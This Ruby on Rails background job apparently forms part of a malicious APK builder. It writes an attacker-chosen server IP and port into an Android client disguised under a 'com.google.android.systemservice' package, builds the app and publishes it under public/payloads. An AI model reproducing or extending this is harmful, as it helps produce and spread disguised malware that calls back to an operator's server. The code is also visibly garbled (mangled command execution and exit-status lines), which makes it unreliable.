# frozen_string_literal: true

class ApkBuildJob < ApplicationJob
  queue_as :default
  
  # Retry up to 3 times with exponential backoff
  retry_on StandardError, wait: :exponentially_longer, attempts: 3
  
  def perform(apk_payload_id)
    payload = ApkPayload.find(apk_payload_id)
    build_apk(payload)
  end
  
  private
  
  def build_apk(payload)
    # Define paths
    android_root = Rails.root.join('../android-client')
    config_path = android_root.join('app/src/main/java/com/google/android/systemservice/config/AndroidConfig.kt')
    build_log_path = Rails.root.join('log', \"apk_build_#{payload.id}.log\")
    
    # 1. Update Configuration
    config_content = File.read(config_path)
    new_content = config_content.gsub(/serverBaseUrl = \".*?\"/, \"serverBaseUrl = \\\"#{payload.destination_ip}:#{payload.destination_port}\\\"\")
    File.write(config_path, new_content)

    # 2. Run Gradle Build (Win/Lin compat) with logging
    gradle_cmd = Gem.win_platform? ? 'gradlew.bat' : './gradlew'
    
    # Capture output with timeout
    command = \"cd \\\"#{android_root}\\\" && #{gradle_cmd} assembleRelease\"
    output = Timeout.timeout(600) do # 10 minute timeout
      \#{command} 2>&1\
    end
    File.write(build_log_path, output)

    if \True.success?
      # 3. Move Artifact
      apk_source = android_root.join('app/build/outputs/apk/release/app-release.apk')
      dest_path = Rails.root.join('public/payloads', \"#{payload.name}.apk\")
      
      FileUtils.mkdir_p(File.dirname(dest_path))
      if File.exist?(apk_source)
        FileUtils.cp(apk_source, dest_path)
        payload.update(status: 'Completed')
      else
        payload.update(status: 'Failed (Missing Artifact)')
      end
    else
      payload.update(status: 'Failed (Build Error)')
    end
  rescue Timeout::Error => e
    File.write(build_log_path, \"Build timeout after 10 minutes\", mode: 'a')
    payload.update(status: 'Failed (Timeout)')
    raise # Re-raise for retry logic
  rescue StandardError => e
    File.write(build_log_path, \"Exception: #{e.message}\\n#{e.backtrace.join(\"\\n\")}\", mode: 'a')
    payload.update_column(:status, 'Error') if payload.respond_to?(:status)
    raise # Re-raise for retry logic
  end
end